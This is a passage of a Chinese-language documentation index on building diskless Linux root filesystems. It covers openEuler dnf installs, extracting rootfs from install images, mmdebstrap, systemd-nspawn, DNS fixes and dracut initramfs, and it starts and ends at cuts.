#I5MAW5 \u00b7 src-openEuler/rpm - Gitee.com \u4e2d\uff0cOpenEuler \u5f00\u53d1\u8005\u8868\u793a OpenEuler \u7684 <code>dnf</code> \u5c06\u575a\u6301\u4f7f\u7528\u843d\u540e\u7684 ndb\uff0c\u5e0c\u671b\u5b9e\u73b0\u8f6f\u4ef6\u4f9d\u8d56\u81ea\u95ed\u73af\u3002\u8fd9\u4e00\u6001\u5ea6\u4e0d\u597d\u8bc4\u4ef7\u3002</p> <p>\u8be5\u65b9\u6cd5\u4ecd\u7136\u9002\u7528\u4e8e\u5176\u4ed6\u57fa\u4e8e <code>dnf</code> \u7684\u53d1\u884c\u7248\uff0c\u6bd4\u5982 Fedora\u3001RockyLinux \u7b49\u3002</p> <p>\u4ee5\u5bbf\u4e3b\u673a\u4e3a Debian \u4e3a\u4f8b\uff0c\u5b89\u88c5 <code>dnf</code> \u548c <code>rpm</code> \u5305\uff0c\u5728\u5bbf\u4e3b\u673a\u914d\u7f6e\u597d openEuler \u6e90\uff1a</p> /etc/yum.repos.d/openEuler.repo<pre><code>[openEuler]\nname=openEuler-$releasever-OS\nbaseurl=https://mirrors.zju.edu.cn/openeuler/openEuler-$releasever/OS/$basearch/\nenabled=1\ngpgcheck=1\ngpgkey=https://mirrors.zju.edu.cn/openeuler/openEuler-$releasever/OS/$basearch/RPM-GPG-KEY-openEuler\n</code></pre> <p>\u7136\u540e\u4f7f\u7528 <code>dnf</code> \u5b89\u88c5\u5230\u6307\u5b9a\u76ee\u5f55\u3002\u9700\u8981\u6ce8\u610f\uff0c\u5e94\u5f53\u63d0\u524d\u6302\u8f7d <code>/proc</code> \u7b49\u76ee\u5f55\uff0c\u5426\u5219\u5b89\u88c5\u8fc7\u7a0b\u4e2d\u4f1a\u63d0\u793a <code>/proc</code> \u7f3a\u5931\u7b49\u3002\u6b64\u5916\uff0crpm \u8f6f\u4ef6\u5305\u4f3c\u4e4e\u53ef\u4ee5\u610f\u8bc6\u5230\u81ea\u5df1\u5904\u4e8e chroot \u73af\u5883\uff0c\u4ece\u800c\u8df3\u8fc7\u542f\u52a8\u6b65\u9aa4\u3002</p> <pre><code>dnf --installroot=\"$CHROOT_TARGET\" \\\n    --repo=openEuler \\\n    --releasever=\"$RELEASE\" \\\n    -y groupinstall core\n</code></pre>"},{"location":"operation/system/diskless/distros/#\u4ece\u5b89\u88c5\u955c\u50cf\u4e2d\u63d0\u53d6\u6700\u5c0f\u7cfb\u7edf","title":"\u4ece\u5b89\u88c5\u955c\u50cf\u4e2d\u63d0\u53d6\u6700\u5c0f\u7cfb\u7edf","text":"<p>deprecated</p> <p>\u5728 Debian \u7cfb\u7edf\u4e0a\u6709 dnf \u5305\uff0c\u5efa\u8bae\u4f7f\u7528 dnf \u5b89\u88c5\u65b9\u5f0f\u3002\u672c\u65b9\u5f0f\u7559\u4f5c\u5907\u4efd\u3002</p> <p>\u9664\u53bb\u6742\u4e03\u6742\u516b\u7684\u955c\u50cf\uff0c\u5728 x86_64 \u67b6\u6784\u4e0b\uff0cOpenEuler \u63d0\u4f9b\u4e09\u79cd\u955c\u50cf\uff1a</p> <ul> <li> <p><code>netinst</code>\uff1a\u7f51\u7edc\u5b89\u88c5\u955c\u50cf\uff0c\u53ea\u5305\u542b\u6700\u57fa\u672c\u7684\u7cfb\u7edf\u3002</p> <pre><code>.\n\u251c\u2500\u2500 docs\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 OpenEuler-Software-License.docx\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 TRANS.TBL\n\u251c\u2500\u2500 EFI\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 BOOT\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 BOOTX64.EFI\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 fonts\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 TRANS.TBL\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 unicode.pf2\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 grub.cfg\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 grubx64.efi\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 mmx64.efi\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 TRANS.TBL\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 TRANS.TBL\n\u251c\u2500\u2500 images\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 efiboot.img\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 install.img\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 pxeboot\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 initrd.img\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 TRANS.TBL\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 vmlinuz\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 TRANS.TBL\n\u251c\u2500\u2500 isolinux\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 boot.cat\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 boot.msg\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 grub.conf\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 initrd.img\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 isolinux.bin\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 isolinux.cfg\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 ldlinux.c32\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 libcom32.c32\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 libutil.c32\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 splash.png\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 TRANS.TBL\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 vesamenu.c32\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 vmlinuz\n\u251c\u2500\u2500 ks\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 ks.cfg\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 TRANS.TBL\n\u2514\u2500\u2500 TRANS.TBL\n\n9 directories, 32 files\n</code></pre> </li> <li> <p>\u6b63\u5e38\u5b89\u88c5\u955c\u50cf\uff1a\u5305\u542b\u4e00\u4e9b\u57fa\u7840\u8f6f\u4ef6\u5305\u3002</p> <p>\u4e0e <code>netinst</code> \u76f8\u6bd4\uff0c\u591a\u51fa\u4e86 <code>Packages</code> \u548c <code>repodata</code> \u76ee\u5f55\uff0c\u5305\u542b\u8f6f\u4ef6\u5305\u548c\u5143\u6570\u636e\u3002</p> <pre><code>\u251c\u2500\u2500 Packages\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 *.rpm\n\u251c\u2500\u2500 repodata\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 *.xml.zst\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 normal.xml\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 repomd.xml\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 TRANS.TBL\n\u251c\u2500\u2500 RPM-GPG-KEY-openEuler\n</code></pre> </li> <li> <p><code>everything</code>\uff1a\u5728 <code>Packages</code> \u76ee\u5f55\u4e2d\u5305\u542b\u4e86\u6240\u6709\u8f6f\u4ef6\u5305\uff0c\u4f53\u79ef\u5e9e\u5927\u3002\u5728 24.09 \u7248\u672c\u5927\u5c0f\u4e3a 23.7 GB\u3002</p> </li> </ul> <p>\u73b0\u5728\u6211\u4eec\u5e0c\u671b\u4ece\u5b89\u88c5\u955c\u50cf\u4e2d\u627e\u5230\u6700\u5c0f\u7cfb\u7edf\uff0c\u4ee5\u4fbf\u80fd\u591f\u901a\u8fc7 <code>chroot</code> \u8fdb\u884c\u914d\u7f6e\u3002</p> <p>\u6302\u8f7d <code>netinst</code> \u7248\u672c\u7684 <code>iso</code> \u955c\u50cf\uff0c\u67e5\u770b\u5176\u4e2d\u7684\u6587\u4ef6\uff1a</p> <pre><code>mkdir -p /mnt/openEuler\nmount -o loop openEuler-24.09-x86_64-netinst.iso /mnt/openEuler\n</code></pre> <ul> <li><code>EFI</code> \u548c <code>isolinux</code> \u663e\u7136\u662f\u4e3a\u4e86 ISO \u542f\u52a8\u5f15\u5bfc\u4f7f\u7528\u7684\uff08\u7c7b\u4f3c\u4e8e pxelinux\uff09</li> <li>\u800c\u771f\u6b63\u5f15\u5bfc\u8fdb\u5165\u7684\u955c\u50cf\u4f4d\u4e8e <code>images</code> \u76ee\u5f55\u4e0b<ul> <li><code>pxeboot</code> \u76ee\u5f55\u4e0b\u7684 <code>vmlinuz</code> \u548c <code>initrd.img</code> \u4e3a PXE \u5f15\u5bfc\u4f7f\u7528\u7684\u7b80\u5355\u5185\u6838\u548c\u521d\u59cb\u5185\u5b58\u76d8\uff0c\u540e\u8005\u5148\u540e\u4f7f\u7528 <code>xz</code> \u548c <code>cpio</code> \u89e3\u538b\u540e\u53ef\u4ee5\u770b\u5230\u7b80\u5355\u7684\u6839\u6587\u4ef6\u7cfb\u7edf</li> <li><code>efiboot.img</code> \u91cc\u7684\u5185\u5bb9\u548c <code>EFI</code> \u5dee\u4e0d\u591a\uff0c\u4e0d\u77e5\u9053\u662f\u4e0d\u662f\u4e3a\u4e86\u65b9\u4fbf\u5237\u5199\u5f15\u5bfc\u5230 U \u76d8\u7b49\u8bbe\u5907\u6240\u4ee5\u63d0\u4f9b\u4e86\u8fd9\u4e2a\u955c\u50cf</li> <li> <p><code>install.img</code> \u662f\u4e00\u4e2a <code>squashfs</code> \u955c\u50cf\uff0c\u6302\u8f7d\u540e\u5185\u5bb9\u5982\u4e0b\uff0c\u63d0\u793a\u6211\u4eec <code>rootfs.img</code> \u662f\u4e00\u4e2a\u53ef\u4ee5\u8fd0\u884c\u7684 LiveOS \u7684\u6839\u6587\u4ef6\u7cfb\u7edf</p> <pre><code>.\n\u2514\u2500\u2500 LiveOS\n    \u2514\u2500\u2500 rootfs.img\n</code></pre> <p><code>rootfs.img</code> \u662f\u4e00\u4e2a ext4 \u6587\u4ef6\u7cfb\u7edf\uff0c\u5c06\u5176\u89e3\u538b\u51fa\u6765\u5c31\u80fd\u83b7\u5f97\u6211\u4eec\u6240\u9700\u7684\u6700\u5c0f\u7cfb\u7edf\u3002</p> </li> </ul> </li> </ul> <p><code>install.img</code> \u53c8\u53ef\u4ee5\u76f4\u63a5\u4ece\u955c\u50cf\u6e90\u83b7\u53d6\uff0c\u4e8e\u662f\u83b7\u53d6\u6839\u6587\u4ef6\u7cfb\u7edf\u7684\u8fc7\u7a0b\u975e\u5e38\u7b80\u5355\uff1a</p> <pre><code>MIRROR='https://mirrors.zju.edu.cn/openeuler/'\nVERSION='24.09'\nRELEASE=\"openEuler-$VERSION/\"\nFILEPATH='OS/x86_64/images/install.img'\n\nCHROOT_BASE=/pxe/rootfs/openeuler\nROOTIMGPATH='LiveOS/rootfs.img'\n\nTMPDIR=/tmp/openeuler-$TIMESTAMP\nmkdir -p \"$TMPDIR\"\nIMGFILE=$TMPDIR/install.img\n\nwget -O \"$IMGFILE\" $MIRROR$RELEASE$FILEPATH\nunsquashfs -d \"$TMPDIR\" \"$IMGFILE\" $ROOTIMGPATH\nmkdir -p \"$CHROOT_TARGET\"\n7z x -snld \"$TMPDIR/$ROOTIMGPATH\" -o\"$CHROOT_TARGET\"\n</code></pre> <p>Tip</p> <p><code>7zip</code> \u662f\u4e00\u4e2a\u975e\u5e38\u597d\u7528\u7684\u5de5\u5177\uff0c\u53ef\u4ee5\u76f4\u63a5\u89e3\u538b Ext4 \u548c Squashfs \u7b49\u6587\u4ef6\u7cfb\u7edf\u7684 <code>.img</code>\u3001ISO \u6587\u4ef6\u7b49\u3002</p>"},{"location":"operation/system/diskless/distros/#openeuler-\u914d\u7f6e\u4e0e\u7ba1\u7406","title":"OpenEuler \u914d\u7f6e\u4e0e\u7ba1\u7406","text":"<p>\u9605\u8bfb\u5b98\u65b9\u6587\u6863\uff1aopenEuler \u793e\u533a\u5b98\u7f51\u3002</p> <ul> <li>\u6709 DNF \u548c YUM \u4e24\u4e2a\u5305\u7ba1\u7406\u5668\uff0c\u524d\u8005\u662f\u540e\u8005\u7684\u5347\u7ea7\u7248\uff0c\u63a8\u8350\u4f7f\u7528 DNF\u3002</li> </ul>"},{"location":"operation/system/diskless/distros/#openanolis-\u9f99\u8725","title":"OpenAnolis \u9f99\u8725","text":""},{"location":"operation/system/diskless/nfsroot/","title":"\u6838\u5fc3\u673a\u5236\uff1aNFS Root","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/diskless/nfsroot/#\u6838\u5fc3\u673a\u5236nfs-root","title":"\u6838\u5fc3\u673a\u5236\uff1aNFS Root","text":"<p>Abstract</p> <p>\u672c\u6587\u8bb2\u89e3\u4ee5\u4e0b\u5185\u5bb9\uff1a</p> <ul> <li>\u5982\u4f55\u5728\u4e00\u4e2a\u8fd0\u884c\u7684 Linux \u7cfb\u7edf\u4e0a\u6784\u5efa\u5176\u4ed6\u53d1\u884c\u7248\u7684\u6839\u6587\u4ef6\u7cfb\u7edf</li> <li>\u5982\u4f55\u4f7f\u7528 <code>systemd-nspawn</code> \u4ece\u6839\u6587\u4ef6\u7cfb\u7edf\u4e2d\u542f\u52a8\u4e00\u4e2a\u865a\u62df\u5316\u73af\u5883\u8fdb\u884c\u914d\u7f6e</li> <li>\u5982\u4f55\u4fee\u6539 <code>initramfs</code> \u4ee5\u652f\u6301 NFSRoot\u3001OverlayFS \u7b49\u529f\u80fd</li> </ul> <p>\u7531\u4e00\u4e2a\u670d\u52a1\u5668\u627f\u8f7d\u5e76\u5171\u4eab\u7684\u6839\u6587\u4ef6\u7cfb\u7edf\uff0c\u662f\u65e0\u76d8\u7cfb\u7edf\u7684\u6838\u5fc3\u3002\u5b83\u5305\u542b\u4e86\u64cd\u4f5c\u7cfb\u7edf\u7684\u6838\u5fc3\u6587\u4ef6\uff0c\u5982\u5185\u6838\u3001\u5e93\u3001\u914d\u7f6e\u6587\u4ef6\u7b49\u3002\u65e0\u76d8\u96c6\u7fa4\u4e2d\u7684\u5176\u4ed6\u8282\u70b9\u901a\u8fc7 NFS Root \u6302\u8f7d\u8be5\u6587\u4ef6\u7cfb\u7edf\uff0c\u5b9e\u73b0\u65e0\u76d8\u542f\u52a8\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/diskless/nfsroot/#\u751f\u6210\u6839\u6587\u4ef6\u7cfb\u7edfmmdebstrap","title":"\u751f\u6210\u6839\u6587\u4ef6\u7cfb\u7edf\uff1a<code>mmdebstrap</code>","text":"<p>Quote</p> <ul> <li>Debian Wiki: SystemBuildTools</li> <li>Ubuntu Wiki: Base</li> <li>Archlinux Wiki: Install Arch Linux from existing Linux</li> <li>Debian Wiki: Debootstrap\uff0c\u53ef\u4ee5\u6307\u5b9a\u7248\u672c\u3001\u67b6\u6784\u3001\u6e90\u7b49\u3002</li> </ul> <p>\u5404\u53d1\u884c\u7248\u4e00\u822c\u6709\u76f8\u5e94\u5de5\u5177\u4e3a\u4e0d\u540c\u7248\u672c\u3001\u4e0d\u540c\u67b6\u6784\u751f\u6210\u6839\u6587\u4ef6\u7cfb\u7edf\uff0c\u7528\u4e8e\u5236\u4f5c\u65e0\u76d8\u7cfb\u7edf\u3001Docker \u7b49\u3002\u6211\u4eec\u5c06\u4f7f\u7528\u8fd9\u4e9b\u5de5\u5177\u751f\u6210\u6839\u6587\u4ef6\u7cfb\u7edf\uff0c\u5728\u6b64\u57fa\u7840\u4e0a\u8fdb\u884c\u914d\u7f6e\u3002\u4e0b\u9762\u4ee5 Debian \u4e3a\u4f8b\uff0c\u4f7f\u7528 <code>mmdebstrap</code> \u5de5\u5177\u751f\u6210\u6839\u6587\u4ef6\u7cfb\u7edf\u3002</p> <p>\u5173\u4e8e <code>debootstrap</code></p> <p><code>debootstrap</code> \u6bd4 <code>mmdebstrap</code> \u66f4\u5e38\u89c1\uff0cDebian Wiki \u4e5f\u4e0a\u6709\u5173\u4e8e\u5b83\u7684\u8be6\u7ec6\u6559\u7a0b\u3002\u6211\u4eec\u4f7f\u7528\u7684 <code>mmdebstrap</code> \u4e0e\u4e4b\u7c7b\u4f3c\uff0c\u4f46\u4f7f\u7528 <code>apt</code> \u6765\u89e3\u51b3\u4f9d\u8d56\u5173\u7cfb\uff0c\u56e0\u6b64\u53ef\u4ee5\u4f7f\u7528\u591a\u4e2a\u955c\u50cf\u6e90\u5e76\u89e3\u51b3\u66f4\u590d\u6742\u7684\u4f9d\u8d56\u5173\u7cfb\u3002\u5728 Debian CI/CD \u5e73\u53f0 \u4e0a\uff0c\u5b83\u88ab\u7528\u4e8e\u751f\u6210\u6d4b\u8bd5\u73af\u5883\uff0c\u56e0\u6b64\u6211\u4eec\u4e5f\u9009\u7528\u5b83\u3002</p> <p>\u4e0d\u8fc7 <code>mmdebstrap</code> \u4e5f\u6709\u4e00\u4e9b\u95ee\u9898\uff08\u56e0\u4e3a\u4f7f\u7528\u4e86 APT \u548c\u7cfb\u7edf\u7684 keyring\uff09\u3002\u6bd4\u5982\u5728 Debian \u7cfb\u7edf\u4e0a\u5b89\u88c5 Ubuntu \u5c31\u9700\u8981\u9884\u5148\u5b89\u88c5 <code>ubuntu-keyring</code>\uff0c\u5426\u5219\u4ea7\u751f\u5982\u4e0b\u9519\u8bef\uff1a</p> <pre><code>I: running apt-get update...\nGet:1 &lt;https://mirrors.zju.edu.cn/ubuntu&gt; oracular InRelease [265 kB]\nErr:1 &lt;https://mirrors.zju.edu.cn/ubuntu&gt; oracular InRelease\nThe following signatures couldn't be verified because the public key is not available: NO_PUBKEY 871920D1991BC93C\nReading package lists...\nW: GPG error: &lt;https://mirrors.zju.edu.cn/ubuntu&gt; oracular InRelease: The following signatures couldn't be verified because the public key is not available: NO_PUBKEY 871920D1991BC93C\nE: The repository '&lt;https://mirrors.zju.edu.cn/ubuntu&gt; oracular InRelease' is not signed.\nE: apt-get update --error-on=any -oAPT::Status-Fd=&lt;$fd&gt; -oDpkg::Use-Pty=false failed\n</code></pre> <p>\u8be6\u89c1  Missing security updates in images created with debootstrap \u00b7 Issue #534 \u00b7 systemd/mkosi</p> <p>\u4e0b\u9762\u7684\u547d\u4ee4\u751f\u6210\u4e00\u4e2a\u57fa\u672c\u7684\u6839\u6587\u4ef6\u7cfb\u7edf\u3002</p> <pre><code>mmdebstrap stable /pxe/rootfs/debian/stable http://mirrors.zju.edu.cn/debian\n</code></pre> <p>\u5e94\u5f53\u91cd\u65b0\u914d\u7f6e APT \u6e90</p> <p>\u5728\u4e0a\u9762\u547d\u4ee4\u884c\u4e2d\u6307\u5b9a\u7684\u7248\u672c\u4f1a\u88ab\u5199\u5165\u5230 APT \u6e90\uff0c\u56e0\u6b64\u4e0d\u5efa\u8bae\u4f7f\u7528 <code>stable</code> \u7b49\u901a\u7528\u7248\u672c\u53f7\uff0c\u5e94\u8be5\u6307\u5b9a\u5177\u4f53\u7684\u7248\u672c\u53f7\u3002\u800c\u4e14\u751f\u6210\u7684 APT \u6e90\u53ea\u4f1a\u5305\u542b <code>main</code> \u90e8\u5206\uff0c\u5e94\u5f53\u91cd\u65b0\u914d\u7f6e\u5b8c\u6574\u7684\u955c\u50cf\u6e90\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/diskless/nfsroot/#\u8fdb\u5165\u6839\u6587\u4ef6\u7cfb\u7edfsystemd-nspawn","title":"\u8fdb\u5165\u6839\u6587\u4ef6\u7cfb\u7edf\uff1a<code>systemd-nspawn</code>","text":"<p>Quote</p> <ul> <li>Debian Wiki: systemd-nspawn</li> <li>Pid Eins: systemd for Administrators, Part VI Changing Roots</li> </ul> <p>\u5173\u4e8e <code>chroot</code></p> <ul> <li>systemd-nspawn vs chroot and bind mount? - Unix &amp; Linux Stack Exchange</li> </ul> <p>\u66f4\u591a\u6559\u7a0b\u4f1a\u901a\u8fc7 <code>chroot</code> \u8fdb\u5165\u6839\u6587\u4ef6\u7cfb\u7edf\uff0c\u4f46\u8fd9\u79cd\u65b9\u5f0f\u4f1a\u5bfc\u81f4\u4e00\u4e9b\u95ee\u9898\uff0c\u5982 <code>systemd</code> \u65e0\u6cd5\u6b63\u5e38\u542f\u52a8\u3002\u8fdb\u9636\u7684\u65b9\u6cd5\u662f\u4f7f\u7528 <code>systemd-nspawn</code> \u4ece\u6839\u6587\u4ef6\u7cfb\u7edf\u542f\u52a8\u4e00\u4e2a\u8f7b\u91cf\u5316\u7684\u5bb9\u5668\uff0c\u4e0e\u5bbf\u4e3b\u673a\u7684\u73af\u5883\u9694\u79bb\uff0c\u8fd9\u6837\u5c31\u80fd\u5b8c\u6210 <code>systemd</code> \u7b49\u5173\u952e\u670d\u52a1\u7684\u914d\u7f6e\u3002\u8981\u4f7f\u7528 <code>systemd-nspawn</code>\uff0c\u9700\u8981\u5728\u5bbf\u4e3b\u673a\u4e0a\u5b89\u88c5 <code>systemd-container</code> \u5305\u3002</p> <p>\u5173\u4e8e Linux \u547d\u540d\u7a7a\u95f4</p> <ul> <li>Namespaces in operation, part 1: namespaces overview [LWN.net]</li> <li>\u63ed\u79d8\u5bb9\u5668 (\u4e00)\uff1a\u5185\u6838\u7a7a\u95f4 chroot &amp; namespace - \u6f58\u5fe0\u663e</li> </ul> <p>\u547d\u540d\u7a7a\u95f4\uff08Namespace\uff09\u662f Linux \u5185\u6838\u63d0\u4f9b\u7684\u4e00\u79cd\u673a\u5236\uff0c\u7528\u4e8e\u9694\u79bb\u7cfb\u7edf\u8d44\u6e90\u3002\u901a\u8fc7\u547d\u540d\u7a7a\u95f4\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u4e00\u4e2a\u8fdb\u7a0b\u4e2d\u521b\u5efa\u4e00\u4e2a\u9694\u79bb\u7684\u73af\u5883\uff0c\u4f7f\u5f97\u8fd9\u4e2a\u8fdb\u7a0b\u770b\u5230\u7684\u7cfb\u7edf\u8d44\u6e90\u662f\u6709\u9650\u7684\u3002\u8fd9\u9879\u673a\u5236\u4e3a\u5bb9\u5668\u865a\u62df\u5316\u7b49\u6280\u672f\u63d0\u4f9b\u4e86\u57fa\u7840\uff08Docker\u3001LXC \u7b49\uff09\u3002\u4ece 2013 \u5e74\u53d1\u5e03\u7684 Linux v3.8 \u5f00\u59cb\uff0c\u975e\u7279\u6743\u8fdb\u7a0b\u53ef\u4ee5\u521b\u5efa\u547d\u540d\u7a7a\u95f4\uff0c\u5728\u5176\u4e2d\u62e5\u6709\u5b8c\u6574\u6743\u9650\uff0c\u4e3a rootless \u5bb9\u5668\u63d0\u4f9b\u4e86\u57fa\u7840\u3002</p> <p>\u5bb9\u5668\u542f\u52a8\u65f6\u4f7f\u7528\u7684\u5185\u6838\u4e0e\u5bbf\u4e3b\u673a\u4e00\u81f4\u3002</p> <pre><code>systemd-nspawn -D /pxe/rootfs/debian/bookworm\npasswd\nlogout\nsystemd-nspawn -D /pxe/rootfs/debian/bookworm /sbin/init\n</code></pre> <p>\u9996\u5148\u5728\u5bb9\u5668\u5185\u542f\u52a8\u4e00\u4e2a shell \u914d\u7f6e\u7528\u6237\u540d\u5bc6\u7801\uff0c\u6700\u540e\u4e00\u884c\u547d\u4ee4\u5728\u5bb9\u5668\u4e2d\u8fd0\u884c <code>/sbin/init</code>\uff0c\u4ee5\u6267\u884c\u5b8c\u6574\u7684\u542f\u52a8\u8fc7\u7a0b\u3002\u8be5\u547d\u4ee4\u8fd8\u6709\u5f88\u591a\u53c2\u6570\uff0c\u53ef\u4ee5\u914d\u7f6e\u7f51\u7edc\u3001\u6302\u8f7d\u3001\u73af\u5883\u53d8\u91cf\u7b49\u3002\u8be6\u89c1 FreeDesktop: systemd-nspawn\u3002</p> <p>\u63a5\u4e0b\u6765\u5b89\u88c5\u5185\u6838\u3001\u4e00\u4e9b\u57fa\u7840\u7684\u5305\uff0c\u5e76\u914d\u7f6e\u8f6f\u4ef6\u6e90\u7b49\uff1a</p> <pre><code>apt install ca-certificates vim\n# \u914d\u7f6e\u8f6f\u4ef6\u6e90\napt update &amp;&amp; apt upgrade\napt install linux-image-amd64\n</code></pre> <p>\u6ce8\u610f\u8bb0\u5f55\u6b64\u6b21\u5b89\u88c5\u7684\u5185\u6838\u7248\u672c\uff0c\u540e\u7eed\u9700\u8981\u751f\u6210 initramfs \u65f6\u4f1a\u7528\u5230\u3002</p> <pre><code>apt list --installed | grep linux\n</code></pre> <p>\u4ee5 <code>linux-image-6.1.0-21-amd64</code> \u4e3a\u4f8b\uff0c\u5219\u5185\u6838\u7248\u672c\u4e3a <code>6.1.0-21-amd64</code>\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/diskless/nfsroot/#\u89e3\u51b3-dns-\u95ee\u9898","title":"\u89e3\u51b3 DNS \u95ee\u9898","text":"<p>Archlinux Wiki \u4e0a\u5bf9 DNS \u4f5c\u4e86\u4e00\u4e9b\u5f52\u7eb3\u3002\u5982\u679c\u5bbf\u4e3b\u673a\u8fd0\u884c <code>systemd-resolved</code>\uff0c\u5219\u5bb9\u5668\u4e2d\u7684 <code>/etc/resolv.conf</code> \u4f1a\u901a\u8fc7\u590d\u5236\u6216 bind-mount \u7684\u65b9\u5f0f\u4e0e\u5bbf\u4e3b\u673a\u4fdd\u6301\u4e00\u81f4\u3002</p> <p>\u7136\u800c\u5728 nspanw \u5230 Ubuntu \u65f6\uff0c\u5e38\u5e38\u9047\u5230 DNS \u65e0\u6cd5\u89e3\u6790\u7684\u95ee\u9898\uff1a</p> <pre><code>W: Failed to fetch https://mirrors.zju.edu.cn/ubuntu/dists/oracular/InRelease  Temporary failure resolving 'mirrors.zju.edu.cn'\n</code></pre> <p>\u5728\u811a\u672c\u4e2d\u4f7f\u7528 <code>&gt;/etc/resolv.conf</code> \u5199\u5165\u6587\u4ef6\uff0c\u5374\u53d1\u73b0\u627e\u4e0d\u5230\u6587\u4ef6\uff1a</p> <pre><code>/root/20241114T000408CST.sh: line 92: /etc/resolv.conf: No such file or directory\n</code></pre> <p>\u8fd9\u4e00\u9519\u8bef\u5341\u5206\u6709\u8bef\u5bfc\u6027\u3002Ubuntu \u4e2d <code>/etc/resolv.conf</code> \u662f\u4e00\u4e2a\u7b26\u53f7\u94fe\u63a5\uff0c\u6307\u5411 <code>/run/systemd/resolve/stub-resolv.conf</code>\uff0c\u800c\u94fe\u63a5\u7684\u5bf9\u8c61\u4e0d\u5b58\u5728\u3002Debian \u4e2d\u5219\u662f\u4e00\u4e2a\u6587\u4ef6\u3002</p> <p> [systemd-nspawn] resolv-conf-setup fails with resolved guest in stub-mode \u89e3\u91ca\u4e86 DNS \u5931\u8d25\u7684\u539f\u56e0\uff1a</p> <p>So if <code>/etc/resolv.conf</code> exists as symlink, nspawn assumes the thing is managed by something smart (such as resolved inside the container) and doesn't want to break things and hence doesn't replace the thing. I am a bit conservative in wanting to change this behaviour. i.e. if we just blindly replace it with a regular file and then you next boot up the image in qemu or on a physical host, then resolved will be borked for good. Hence, for the automatic, implicit behaviour I think we should only replace the thing when it is a regular file (because that just means staying within the same type of setup, just with fresher data) and not when it is a symlink (because that would mean changing the type of setup).</p> <p>Hence I think I'll add a new mode --resolv-conf=replace-stub which is like copy-stub but replaces whatever exists regardless what it is.</p> <p>\u7136\u800c\u4f7f\u7528 <code>--resolv-conf=replace-stub</code> \u4e5f\u4f1a\u4ea7\u751f\u9519\u8bef\uff1a</p> <pre><code>Failed to copy /etc/resolv.conf to /pxe/rootfs/ubuntu/oracular.error/etc/resolv.conf, ignoring: No such file or directory\n</code></pre> <p>\u8fd9\u662f\u56e0\u4e3a\u5728 Debian 12 \u53ca\u4ee5\u4e0a\uff0c<code>systemd-resolved</code> \u9ed8\u8ba4\u4e0d\u5b89\u88c5\uff08\u89c1 Debiab bookworm Release Notes\u3002\u5b89\u88c5 <code>systemd-resolved</code> \u5373\u53ef\u4f7f\u7528 <code>--resolv-conf=replace-stub</code> \u89e3\u51b3 DNS \u95ee\u9898\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/diskless/nfsroot/#\u751f\u6210-initramfs-dracut-ngdracut-ng","title":"\u751f\u6210 initramfs\uff1a dracut-ng/dracut-ng","text":"<p>Quote</p> <ul> <li>GitHub: dracut User Manual</li> <li>Spinics: rootnfs + rootovl (diskless client shutdown problem)</li> </ul> <p>\u6211\u4eec\u4f7f\u7528 <code>dracut</code> \u5de5\u5177\u751f\u6210 initramfs\u3002\u4e0e Debian \u9ed8\u8ba4\u4f7f\u7528\u7684 <code>initramfs-tools</code> \u76f8\u6bd4\uff0c\u5b83\u53ef\u4ee5\u901a\u8fc7\u6a21\u5757\u65b9\u4fbf\u5730\u652f\u6301 OverlayFS \u7b49\u529f\u80fd\uff0c\u7b26\u5408\u6211\u4eec\u7684\u9700\u6c42\u3002</p> <p>\u7b80\u5355\u6765\u8bf4\uff0cdracut-ng \u662f\u4e00\u4e2a\u4e8b\u4ef6\u9a71\u52a8\u7684 initramfs\u3002\u5b83\u8ba4\u4e3a\u6211\u4eec\u6302\u8f7d rootfs \u7684\u8fc7\u7a0b\u672c\u8d28\u4e0a\u4f9d\u8d56\u4e8e\u786c\u4ef6\u7684\u53ef\u7528\u6027\uff0c\u5e94\u5f53\u57fa\u4e8e udev 